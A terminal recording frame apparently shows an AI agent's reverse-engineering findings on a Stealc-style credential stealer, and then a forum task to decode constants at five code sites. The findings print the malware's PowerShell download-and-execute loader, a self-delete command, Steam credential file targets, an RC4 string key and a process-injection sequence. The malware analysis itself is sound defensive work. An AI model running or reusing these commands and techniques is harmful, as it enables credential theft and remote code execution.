[0.014, "o", "\u001b[4;1H\u001b[93m\u001b[1mCampaign/build ID:\u001b(B\u001b[m\u001b[93m 512e7bd98498\u001b[Cfb6 (plaintext @ DAT_1400b\u001b[C5f0).\u001b[39m                  \u001b[6;1H\u001b[93m\u001b[1mCrypto:\u001b(B\u001b[m\u001b[93m R\u001b[C4\u001b[Cs\u001b[Cring key CgeOvEO7hu @ 0x14007d6e0; scheme base64→RC4 for all embedded stri\u001b[Cgs.\u001b[39m                                                    \r\n                                                                                                                                          \r\n\u001b[93m\u001b[1mHost artifacts:\u001b(B\u001b[m                                                                             \u001b[10;1H\u001b[93m- Named event (single-instance guard): <%p>_<ComputerName>_<UserName> (pointer value formatted at runtime — pattern, not fixed string).\r\n- Staging dir C:\\ProgramData\\<random> for locked-file exfil copies; exfil filenames passwords.txt, screenshot.jpg.\r\n- Self-delete: cmd.exe\u001b[C/c timeout\u001b[C/t 5 & del /f /q \"<own path>\".\u001b[39m                            \r\n\u001b[93m- Loader: powershell.exe -nop -c iex(New-Object Net.WebClient).DownloadString('<URL from C2>') (SysWOW64 path), msiexec /i … /passive,\r\nShellExecuteExA runas.\r\n- Steam theft masks: ssfn*,config.vdf,DialogConfig.vdf,DialogConfigOverlay*.vdf,libraryfolders.vdf,loginusers.vdf under HKCU\\Software\\Valve\\Steam →\r\nSte\u001b[2CPath.\u001b[39m                                                                                                                             \r\n                                                                                                                  \r\n\u001b[93m\u001b[1mBehavioral:\u001b(B\u001b[m\u001b[93m \u001b[Cxits on LANGIDs 0x419\u001b[C0x422/0x423/0x43F/0x443 (RU/UA/BY/KZ/UZ); date kill-switch — payload skipped after\u001b[1m 11 April 2025\u001b(B\u001b[m\u001b[93m; Early-Bird APC\r\ninjection\u001b[C(Cr\u001b[CateProc\u001b[Css\u001b[Csus\u001b[Cended → VirtualAllocEx RWX 0x25600 → WriteProcessMemory → QueueUserAPC) of browser\u001b[Cprocess; IElevator COM (CLSID\r\n{708860E0-…}) fo\u001b(B\u001b[m\u001b[C\u001b[93m app-bound key decryption; volume-serial-derived named pipe between host and helper DLL.\r\n\u001b[39m                                                                                                                                                   \r\n\u001b[93m\u001b[1mDistinctive strings:\u001b(B\u001b[m\u001b[93m C:\\builder_v2\\stealc\\json.h, typo Error dumping proccess list, report lines \\t\\t\\tDevice Name: , \\t- Running Path: .\u001b[24;1H\u001b[31m●\u001b[39m \u001b[90mmain · ▸ finish() · 277 chars\u001b[39m                                                                                                                    \r\n                                                                                                                                             \r\n\u001b[93m📌 #q-residual-decodes — Post the decoded constants at code s\u001b[Ct\u001b[Cs\u001b[C0x14000ab27, 0x14000c835, 0x14001138f, 0x14001ac7b, 0x14001f39b\u001b[36m\u001b[1m main\r\n\u001b(B\u001b[m\u001b[93mHousekeeping: tool-recove\u001b(B\u001b[m\u001b[93mred decoded constants at these five code sites were never published to the forum. For each site — 0x14000ab27, 0x14000c835,\r\n0x14001138f, 0x14001ac7b, 0x14001f39b — identify the refe\u001b[Cenced c\u001b[Cphertext blob / decoded valu\u001b[C,\u001b[Cdecrypt if needed (base64→RC4 key CgeOvEO7hu, per\r\n#q-string-decryption), and post the plaintext verbatim as evidence comments here, noting which function uses it and for what (cross-check against\r\n#q-capabilities / #q-c2-protocol findings). Then mark solved.\u001b[32;114H\u001b[36m\u001b[1m⠏ \u001b(B\u001b[m\u001b[90mThinking…\u001b[39m \u001b[35m\u001b[1mmain\u001b(B\u001b[m\u001b[37m: calling create_po\u001b[Ct\u001b[34;2H\u001b(B\u001b[m"]
